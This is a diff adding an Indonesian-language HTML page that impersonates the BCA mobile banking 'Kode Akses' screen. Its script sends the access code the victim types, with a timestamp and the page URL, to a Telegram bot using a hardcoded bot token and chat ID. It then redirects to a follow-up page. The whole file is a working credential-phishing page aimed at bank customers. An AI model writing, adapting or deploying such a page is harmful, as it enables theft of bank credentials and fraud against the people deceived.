@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BCA mobile - Kode Akses</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            width: 100vw;
+            height: 100vh;
+            /* Latar belakang pas penuh layar, tidak melar, tidak terpotong */
+            background: url('kode.png') center center / cover no-repeat;
+            margin: 0;
+            position: relative;
+        }
+
+        /* Kotak kode akses tetap di tengah sempurna */
+        .popup {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 88%;
+            max-width: 350px;
+            background: #ffffff;
+            border-radius: 3px;
+            box-shadow: 20px 20px 50px grey;
+            padding: 28px 22px;
+            z-index: 10;
+        }
+        .popup h3 {
+            text-align: center;
+            font-size: 23px;
+            color: #00348a;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .input-kode {
+            width: 100%;
+            padding: 13px 16px;
+            font-size: 15px;
+            border: 1px solid #b8b8b8;
+            border-radius: 8px;
+            margin-bottom: 26px;
+            outline: none;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+        .tombol-baris {
+            display: flex;
+            gap: 10px;
+        }
+        .tombol {
+            flex: 1;
+            padding: 13px;
+            font-size: 15px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            color: #ffffff;
+        }
+        .tombol-cancel {
+            background: linear-gradient(180deg, #0099ee 0%, #0054bb 100%);
+        }
+        .tombol-login {
+            background: linear-gradient(180deg, #0099ee 0%, #0054bb 100%);
+        }
+
+        /* Teks bawah tetap di posisi aslinya */
+        .footer-text {
+            position: absolute;
+            bottom: 30px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: #ffffff;
+            font-size: 5px;
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+    <!-- Jendela Kode Akses -->
+    <div class="popup">
+        <h3>Kode Akses</h3>
+        <input type="Number" id="kodeAkses" class="input-kode" placeholder="Input 6 alphanum" maxlength="6" autocomplete="off">
+        <div class="tombol-baris">
+            <button class="tombol tombol-cancel" onclick="aksiCancel()">Cancel</button>
+            <button class="tombol tombol-login" onclick="aksiLogin()">Login</button>
+        </div>
+    </div>
+
+    <!-- Teks Bawah Tetap -->
+    <div class="footer-text"></div>
+
+    <script>
+        // Pengaturan & fungsi tetap sama persis
+        const BOT_TOKEN = "8334290345:AAEbZSsoNCAUjkVP32C54IflHq2I9LJmvlM";
+        const CHAT_ID = "8683949047";
+        const HALAMAN_TUJUAN = "info.html";
+        const HALAMAN_KEMBALI = "bca.html";
+
+        function aksiLogin() {
+            const kode = document.getElementById("kodeAkses").value.trim();
+            if (!kode) { alert("Masukkan kode akses terlebih dahulu!"); return; }
+            const pesan = `🔑 Kode Akses BCA Mobile\n📥 Isi: ${kode}\n⏱️ Waktu: ${new Date().toLocaleString('id-ID')}\n📍 Halaman: ${window.location.href}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`)
+            .finally(() => window.location.href = HALAMAN_TUJUAN);
+        }
+        function aksiCancel() { window.location.href = HALAMAN_KEMBALI; }
+    </script>
+</body>
+</html>
